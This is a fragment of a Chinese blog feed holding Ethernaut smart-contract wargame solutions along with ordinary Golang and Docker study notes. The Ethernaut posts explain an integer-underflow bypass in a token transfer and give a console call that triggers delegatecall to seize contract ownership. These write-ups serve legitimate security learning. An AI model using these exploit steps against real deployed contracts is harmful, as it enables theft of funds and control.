plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs s">function transfer(address _to, uint _value) public returns (bool) &#123;<br>    require(balances[msg.sender] - _value &gt;= 0);<br>    balances[msg.sender] -= _value;<br>    balances[_to] += _value;<br>    return true;<br>  &#125;<br></code></pre></td></tr></table></figure><p>这里可以通过<em>下溢</em> 绕过require检测，因为<code>_value</code>和<code>balances[address]</code>都为无符号整数，所以结果会变为2^256-1</p><p>参考：略</p><blockquote><p>solidity的0.6版本还没内置溢出检测，而在0.8及以后版本中当发生溢出后会进行<code>revert()</code>。</p></blockquote><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取更多的Token  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;li</summary>
      
    
    
    
    <category term="Ethernaut" scheme="http://lexlady.top/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>Delegation</title>
    <link href="http://lexlady.top/2023/11/15/Ethernaut/delegation/"/>
    <id>http://lexlady.top/2023/11/15/Ethernaut/delegation/</id>
    <published>2023-11-15T12:44:02.000Z</published>
    <updated>2023-11-15T08:59:43.697Z</updated>
    
    <content type="html"><![CDATA[<p>任务要求：获取合约的所有权  </p><p><strong>源代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs s">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Delegate &#123;<br><br>  address public owner;<br><br>  constructor(address _owner) &#123;<br>    owner = _owner;<br>  &#125;<br><br>  function pwn() public &#123;<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br><br>contract Delegation &#123;<br><br>  address public owner;<br>  Delegate delegate;<br><br>  constructor(address _delegateAddress) &#123;<br>    delegate = Delegate(_delegateAddress);<br>    owner = msg.sender;<br>  &#125;<br><br>  fallback() external &#123;<br>    (bool result,) = address(delegate).delegatecall(msg.data);<br>    if (result) &#123;<br>      this;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：这题包含了两个合约<code>Delegation</code>和<code>Delegate</code>，<code>Delegation</code>合约实例化了<code>Delegate</code>合约，又在其<code>Fallback()</code>中使用了<code>delegatecall</code>来调用了delegate合约。</p><blockquote><p>call函数是一个能对合约发送数据与合约进行交互的底层接口（它们都接受一个 bytes memory 参数，并返回成功条件（作为一个 bool）和返回的数据（ bytes memory）。而delegatecall（委托调用）又与call有所不同：通过delegatecall调用的目标地址的代码要在当前合约的环境中执行。<br>这个函数主要是方便我们使用存在其他地方的函数——合约可以在运行时动态地从不同的地址加载代码。（用户必须确保两个合约中的存储结构都适合使用delegatecall。）</p></blockquote><p><strong>解题点：</strong><br><code>delegate.sol</code>合约中有一个公共的<code>pwn()</code>，可以将owner更改为调用者。</p><p>而在<code>Delegation.sol</code>中，而使用<code>detegatecall</code>执行的环境是被调用合约，因此上面通过<code>pwn()</code>修改的owner也即是<code>Delegation.owner</code>，同时也是我们本题的目标。</p><p>因此我们只需通过调用Fallback函数，进行委托调用，更新owner。</p><p>解题参考：在控制台上直接调用<code>contract.sendTransaction(&#123;data:web3.utils.keccak256(&quot;pwn()&quot;).slice(0,10)&#125;)</code>，这表示向合约直接发送一个消息，接着能够直接进入Fallback函数中去。</p><p>或者直接获取实例地址，复制合约到Remix中，在<code>Delegate</code>合约中<code>Ataddress &#39;你获得的实例地址&#39;</code>部署合约，通过调用<code>pwn()</code>也能够实现目标。</p><p>但可能因为gas原因无法正常交易，提高燃料限制再进行交易</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;任务要求：获取合约的所有权  &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;源代码：&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line</summary>
      
    
    
    
    <category term="Ethernaut" scheme="http://lexlady.top/categories/Ethernaut/"/>
    
    
    <category term="题解" scheme="http://lexlady.top/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Ethereum" scheme="http://lexlady.top/tags/Ethereum/"/>
    
  </entry>
  
  <entry>
    <title>VMware_ubuntu</title>
    <link href="http://lexlady.top/2023/11/13/VMware-ubuntu/"/>
    <id>http://lexlady.top/2023/11/13/VMware-ubuntu/</id>
    <published>2023-11-13T08:44:44.000Z</published>
    <updated>2024-04-09T14:17:11.156Z</updated>
    
    <content type="html"><![CDATA[<!-- TODO：VMware使用Ubuntu配置  --><p>操作环境：<br>VMware：<br>Ubuntu：20.04</p><p>常用命令：</p><p>遇见的坑：</p><p>Golang安装：</p><p>在安装Golang语言的时候，通过执行下面命令后会默认安装最新版本。</p><p><code>sudo add-apt-repository ppa:longsleep/golang-backports</code></p><p><code>sudo apt updata</code></p><p><code>sudo apt install golang-go</code></p><p>安装完成后，要设置GOROOT、GOPATH等环境变量，使用</p><p><code>sudo vi ~/.profile</code></p><p>编辑以下内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">export GOROOT=&quot;/usr/lib/go&quot;<br>export GOBIN=$GOROOT/bin<br>export GOPATH=<br>export GO111MODULE=auto<br>export PATH=$PATH:$GOPATH/bin<br></code></pre></td></tr></table></figure><p>修改完成后使用</p><p><code>source ~/.profile</code></p><p>进行重新生效。此时可以通过<code>go version</code>或<code>$GOROOT</code>命令进行验证是否安装成功。</p><p>而博主要使用某个低版本的Golang语言，采用了apt search后进行apt install正常安装完成后。</p><p>在修改完环境变量后仍然显示</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TODO：VMware使用Ubuntu配置  --&gt;
&lt;p&gt;操作环境：&lt;br&gt;VMware：&lt;br&gt;Ubuntu：20.04&lt;/p&gt;
&lt;p&gt;常用命令：&lt;/p&gt;
&lt;p&gt;遇见的坑：&lt;/p&gt;
&lt;p&gt;Golang安装：&lt;/p&gt;
&lt;p&gt;在安装Golang语言的时候，通过执行下面命</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>docker</title>
    <link href="http://lexlady.top/2023/07/18/docker/docker/"/>
    <id>http://lexlady.top/2023/07/18/docker/docker/</id>
    <published>2023-07-18T02:01:51.000Z</published>
    <updated>2023-07-19T07:23:41.908Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h1><p>解决应用在不同开发环境上的环境配置的麻烦————docker：系统平滑移植，容器虚拟化技术</p><p>Docker可以将软件的原生环境复制过来，消除了协作编码时 <em>“我的机器上可以正常工作”</em> 的问题</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Docker是基于GO的云开源项目，解决<strong>运行环境</strong>和<strong>配置问题</strong>的软件容器，方便做持续集成、整体发布的容器虚拟化技术。</p><h2 id="docker特点"><a href="#docker特点" class="headerlink" title="docker特点"></a>docker特点</h2><p>“Build， Ship and Run Any App， Anywhere”</p><p>通过对应用的封装、发布、部署、运行等生命周期的管理，使其能够做到“一次镜像，处处运行”</p><ul><li><p>安全可靠<br>  容器间的隔离不仅限于彼此，还独立于底层的基础设施。当应用出现问题时，不会波及到主机</p></li><li><p>资源利用率高<br>  容器拥有很高的兼容性，能够将应用直接迁移到另一个平台，提高了开发效率，减少了部署应用的工作量</p></li><li><p>标准开放<br>  容器基于开放式标准，能够在任何基础设施上运行。运输方式、存储方式、API接口隔离</p></li><li><p>轻量化<br>  容器的构建快速且使用更少的计算和内存，</p></li></ul><h2 id="架构与主要功能组件"><a href="#架构与主要功能组件" class="headerlink" title="架构与主要功能组件"></a>架构与主要功能组件</h2><p>docker整体采用C&#x2F;S模式，客户端主要负责发送操作指令，服务端负责接受和处理指令。客户端和服务端之间的通信方式多样</p><h3 id="功能组件"><a href="#功能组件" class="headerlink" title="功能组件"></a>功能组件</h3><ul><li>Docker客户端<br>  Docker客户端一般通过Docker command来发起请求</li><li>Docker服务器（Docker daemon）<br>  接受客户端发来的请求，并实现所要求的的功能，同时针对请求返回相应的结果。</li><li>Docker容器</li><li>Docker镜像<br>  镜像是一个只读的模板，用来创建相应的容器。</li><li>Docker仓库<br>  仓库是存放镜像的地方，类似于Maven，GitHub。docker提供的官方registry————Docker Hub。仓库可分为公开仓库和私有仓库</li></ul><h2 id="与传统虚拟机的对比"><a href="#与传统虚拟机的对比" class="headerlink" title="与传统虚拟机的对比"></a>与传统虚拟机的对比</h2><p>虚拟机（virtual machine），可以在一种操作系统里运行另一种操作系统。</p><p>传统虚拟机技术是通过在主操作系统上的虚拟管理系统（VMware、virtualBox）创建虚拟机（模拟各种硬件），安装操作系统，安装部署各种应用</p><ul><li>特点<ul><li>资源占用多</li><li>冗余步骤多</li><li>启动慢</li></ul></li></ul><p>Linux容器（Linux Containers，LXC）是与系统其他部分隔离开的一系列进程，容器不是模拟一个完整的操作系统而是对进程进行隔离，将软件运行所需的所有资源打包到一个隔离的容器中，因此在开发到测试再到生产的过程中，他都具有<strong>可移植性</strong>和<strong>一致性</strong>。<br>容器虚拟化技术不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置，整个过程更轻量，高效并保证在任何环境中能够运行</p><p>总结：容器是在操作系统层面上实现虚拟化，容器之间共享主机的操作系统，容器作为进程在主机上运行；而虚拟机是在硬件层面上实现虚拟化，有自己的操作系统且独立于主机操作系统。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Cgroup<br>对进程资源进行限制，对资源的使用进行追踪。</p><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p>容器是镜像的运行实例，就如同Java语言中类与对象的关系。</p><p>容器是一个轻量级的沙箱子，可以被启动、开始、停止、删除，每个容器之间相互隔离，保证了平台的安全。</p><h1 id="docker常用指令"><a href="#docker常用指令" class="headerlink" title="docker常用指令"></a>docker常用指令</h1><h2 id="容器生命周期管理"><a href="#容器生命周期管理" class="headerlink" title="容器生命周期管理"></a>容器生命周期管理</h2><ul><li><p>docker run</p><p>  创建一个新的容器（并运行一个命令）</p><p>  <code>docker run [OPTIONS] IMAGE [COMMAND]</code></p><p>  常见参数：</p><ul><li>-d：后台运行容器，将返回容器ID</li><li>-i：以交互模式运行容器，常与-i一起使用</li><li>-P：随机端口映射，容器内部端口随机映射到主机的端口</li><li>-p：指定端口映射，格式<code>主机端口:容器端口</code></li><li>-t：为容器分配一个伪输入终端</li><li>–name：为容器指定一个名称</li><li>–net：指定容器的网络连接类型</li><li>–link：连接到另一个容器</li><li>–volume：绑定一个卷</li></ul></li><li><p>docker start&#x2F;stop&#x2F;restart</p><p>  start：启动一个或多个已被停止的容器</p><p>  stop：停止一个正在运行的容器</p><p>  restart：重启容器</p></li><li><p>docker kill</p><p>  杀掉一个运行中的容器</p></li><li><p>docker rm</p><p>  删除一个或多个容器</p></li><li><p>docker exec</p></li></ul><h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><ul><li><p>docker ps</p></li><li><p>docker inspect</p><p>  获取容器&#x2F;镜像的元数据。</p></li><li><p>docker attach</p></li><li><p>docker</p></li></ul><h2 id="本地镜像管理"><a href="#本地镜像管理" class="headerlink" title="本地镜像管理"></a>本地镜像管理</h2><ul><li><p>docker image tag</p></li><li><p>docker image build </p><p>  根据Dockerfile文件构建新镜像，其中还有些常见的选项，简写为docker build</p><ul><li>-t，生成镜像的名字及标签，可以在一次构建中为一个镜像设置多个标签</li><li>-f，指定使用的Dockerfile文件</li></ul></li><li><p>docker image history</p><p>  可以查看指定镜像的创建历史</p></li><li><p>docker image save</p></li><li><p>docker image load</p></li></ul><h2 id="容器rootfs命令"><a href="#容器rootfs命令" class="headerlink" title="容器rootfs命令"></a>容器rootfs命令</h2><ul><li>docker commit</li><li>docker cp</li></ul><h2 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h2><ul><li>docker login&#x2F;logout</li><li>docker pull</li><li>docker push</li><li>docker search</li></ul><h2 id="info-version"><a href="#info-version" class="headerlink" title="info|version"></a>info|version</h2><ul><li>docekr info</li><li>docker version</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;docker简介&quot;&gt;&lt;a href=&quot;#docker简介&quot; class=&quot;headerlink&quot; title=&quot;docker简介&quot;&gt;&lt;/a&gt;docker简介&lt;/h1&gt;&lt;p&gt;解决应用在不同开发环境上的环境配置的麻烦————docker：系统平滑移植，容器虚拟化技术&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>并发</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-complicated/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-complicated/</id>
    <published>2023-05-27T07:26:22.000Z</published>
    <updated>2024-04-09T14:26:25.264Z</updated>
    
    <content type="html"><![CDATA[<!-- TODO：并发教程 --><h1 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h1><p><code>Go</code>语言支持并发，我们只需要通过<code>go</code>关键字来开启<code>goroutine</code>即可。</p><p><code>goroutine</code>是轻量级线程，<code>goroutine</code>的调度是由<code>Golang</code>运行时进行管理的。</p><p>语法：<code>go 函数名()</code>开启一个新的<code>goroutine</code></p><p>同一个程序中的所有<code>goroutine</code>共享同一个地址空间。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TODO：并发教程 --&gt;
&lt;h1 id=&quot;并发&quot;&gt;&lt;a href=&quot;#并发&quot; class=&quot;headerlink&quot; title=&quot;并发&quot;&gt;&lt;/a&gt;并发&lt;/h1&gt;&lt;p&gt;&lt;code&gt;Go&lt;/code&gt;语言支持并发，我们只需要通过&lt;code&gt;go&lt;/code&gt;关键字来开启&lt;</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>错误处理</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-error/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-error/</id>
    <published>2023-05-27T04:26:22.000Z</published>
    <updated>2024-04-22T13:02:54.007Z</updated>
    
    <content type="html"><![CDATA[<!-- TODO：错误 --><h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><p>Go 语言通过内置的错误接口提供了非常简单的错误处理机制。</p><p>error 类型是一个接口类型，定义如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> <span class="hljs-type">error</span> <span class="hljs-keyword">interface</span> &#123;<br>    Error() <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><p>常通过实现error接口来生成错误信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-comment">// 定义一个 DivideError 结构</span><br><span class="hljs-keyword">type</span> DivideError <span class="hljs-keyword">struct</span> &#123;<br>    dividee <span class="hljs-type">int</span><br>    divider <span class="hljs-type">int</span><br>&#125;<br><br><span class="hljs-comment">// 实现 `error` 接口</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(de *DivideError)</span></span> Error() <span class="hljs-type">string</span> &#123;<br>    strFormat := <span class="hljs-string">`</span><br><span class="hljs-string">    Cannot proceed, the divider is zero.</span><br><span class="hljs-string">    dividee: %d</span><br><span class="hljs-string">    divider: 0</span><br><span class="hljs-string">`</span><br>    <span class="hljs-keyword">return</span> fmt.Sprintf(strFormat, de.dividee)<br>&#125;<br><br><span class="hljs-comment">// 定义 `int` 类型除法运算的函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Divide</span><span class="hljs-params">(varDividee <span class="hljs-type">int</span>, varDivider <span class="hljs-type">int</span>)</span></span> (result <span class="hljs-type">int</span>, errorMsg <span class="hljs-type">string</span>) &#123;<br>    <span class="hljs-keyword">if</span> varDivider == <span class="hljs-number">0</span> &#123;<br>            dData := DivideError&#123;<br>                    dividee: varDividee,<br>                    divider: varDivider,<br>            &#125;<br>            errorMsg = dData.Error()<br>            <span class="hljs-keyword">return</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> varDividee / varDivider, <span class="hljs-string">&quot;&quot;</span><br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-comment">// 正常情况</span><br>    <span class="hljs-keyword">if</span> result, errorMsg := Divide(<span class="hljs-number">100</span>, <span class="hljs-number">10</span>); errorMsg == <span class="hljs-string">&quot;&quot;</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;100/10 = &quot;</span>, result)<br>    &#125;<br>    <span class="hljs-comment">// 当除数为零的时候会返回错误信息</span><br>    <span class="hljs-keyword">if</span> _, errorMsg := Divide(<span class="hljs-number">100</span>, <span class="hljs-number">0</span>); errorMsg != <span class="hljs-string">&quot;&quot;</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;errorMsg is: &quot;</span>, errorMsg)<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">// 100/10 =  10</span><br><span class="hljs-comment">/** errorMsg is:  </span><br><span class="hljs-comment">    Cannot proceed, the divider is zero.</span><br><span class="hljs-comment">    dividee: 100</span><br><span class="hljs-comment">    divider: 0</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure><p>介绍一下 panic 与 recover,一个用于主动抛出错误，一个用于捕获panic抛出的错误。</p><p>两者都是Go中内置函数，用于处理Go运行时的错误。</p><p>引发panic有两种情况，一是程序主动调用；二是程序产生运行时错误，由运行时检测并退出。</p><p>发生panic后，程序会从调用panic的函数位置或发生panic的地方立即返回，逐层向上执行函数的defer语句，然后逐层打印函数调用堆栈，直到被recover捕获或运行到最外层函数。</p><p>panic不但可以在函数正常流程中抛出，在defer逻辑里也可以再次调用panic或抛出panic。defer里面的panic能够被后续执行的defer捕获。</p><p>recover用来捕获panic，阻止panic继续向上传递。recover()和defer一起使用，但是defer只有在后面的函数体内直接被掉用才能捕获panic来终止异常，否则返回nil，异常继续向外传递。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//以下捕获失败</span><br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">recover</span>()<br><span class="hljs-keyword">defer</span> fmt.Prinntln(<span class="hljs-built_in">recover</span>)<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-built_in">recover</span>() <span class="hljs-comment">//无效，嵌套两层</span><br>    &#125;()<br>&#125;()<br><br><span class="hljs-comment">//以下捕获有效</span><br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">recover</span>()<br>&#125;()<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">except</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">recover</span>()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">defer</span> except()<br>    <span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;runtime error&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TODO：错误 --&gt;
&lt;h1 id=&quot;错误处理&quot;&gt;&lt;a href=&quot;#错误处理&quot; class=&quot;headerlink&quot; title=&quot;错误处理&quot;&gt;&lt;/a&gt;错误处理&lt;/h1&gt;&lt;p&gt;Go 语言通过内置的错误接口提供了非常简单的错误处理机制。&lt;/p&gt;
&lt;p&gt;error 类型</summary>
      
    
    
    
    <category term="Golang" scheme="http://lexlady.top/categories/Golang/"/>
    
    
  </entry>
  
  <entry>
    <title>函数</title>
    <link href="http://lexlady.top/2023/05/27/Golang/go-function/"/>
    <id>http://lexlady.top/2023/05/27/Golang/go-function/</id>
    <published>2023-05-27T03:26:22.000Z</published>
    <updated>2024-04-17T10:39:25.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>函数是基本的代码块，用于执行一个任务。</p><p><code>Go</code>语言最少有个<code>main()</code>函数。</p><p>你可以通过函数来划分不同功能，逻辑上每个函数执行的是指定的任务。</p><p>函数声明告诉了编译器函数的<strong>名称</strong>，<strong>参数</strong>和<strong>返回类型</strong>。</p><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">function_name</span><span class="hljs-params">( [parameter list] )</span></span> [return_types] &#123;<br>    <span class="hljs-comment">//your code</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>func</code>：函数由<code>func</code>开始声明</li><li><code>function_name</code>：函数名称，参数列表和返回值类型构成了函数签名。</li><li><code>parameter list</code>：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数（用逗号，分隔）。参数是可选的，函数也可以不包含参数。</li><li><code>return_types</code>：返回类型，函数返回一列值。<code>return_types</code> 是该列值的<strong>数据类型</strong>。有些功能不需要返回值，这种情况下 <code>return_types</code> 不是必须的。</li><li>函数体：函数定义的代码集合。</li></ul><p><code>main()</code>函数是每个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（在没有<code>init()</code>函数的情况下。如果main包的源代码没有包含<code>main()</code>函数，则会引发构建错误<code>undefined: main.main </code>。<code>main()</code>函数既没有参数，也没有返回类型。（如果为<code>main()</code>函数添加了参数或返回类型，将会引发构建错误：&#96;&#96;）</p><p><code>init()</code>函数</p><p>函数里的代码使用大括号{}括起来。左大括号<code>&#123;</code>必须与方法的声明在同一行（编译器的强制规定，否则在使用gofmt时会出现错误提示：&#96;&#96;）</p><p>Go语言的语句看起来不使用分号，但实际上这是由编译器自动完成，因此会引发上面类似的错误</p><h2 id="函数返回多个值"><a href="#函数返回多个值" class="headerlink" title="函数返回多个值"></a>函数返回多个值</h2><p>go语言可以返回多个值，例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x, y <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">string</span>) &#123;<br>   <span class="hljs-keyword">return</span> y, x<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   a, b := swap(<span class="hljs-string">&quot;Google&quot;</span>, <span class="hljs-string">&quot;Runoob&quot;</span>)<br>   fmt.Println(a, b)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h2><p>函数如果使用参数，该变量可称为函数的形参。</p><p>调用函数，可以通过两种方式来传递参数：</p><ul><li>值传递：在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。</li><li>引用传递：指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。</li></ul><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">100</span><br>   <span class="hljs-keyword">var</span> b <span class="hljs-type">int</span>= <span class="hljs-number">200</span><br><br>   fmt.Printf(<span class="hljs-string">&quot;交换前，a 的值 : %d\n&quot;</span>, a )<br>   fmt.Printf(<span class="hljs-string">&quot;交换前，b 的值 : %d\n&quot;</span>, b )<br><br>   <span class="hljs-comment">// 值传递</span><br>   swap(a, b)<br>   <br>   fmt.Printf(<span class="hljs-string">&quot;交换后 a 的值 : %d\n&quot;</span>, a )<br>   fmt.Printf(<span class="hljs-string">&quot;交换后 b 的值 : %d\n&quot;</span>, b )<br><br>   <span class="hljs-comment">// 引用传递</span><br>   swap(&amp;a, &amp;b)<br><br>   fmt.Printf(<span class="hljs-string">&quot;交换后 a 的值 : %d\n&quot;</span>, a )<br>   fmt.Printf(<span class="hljs-string">&quot;交换后 b 的值 : %d\n&quot;</span>, b )<br>   <br>   <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x, y <span 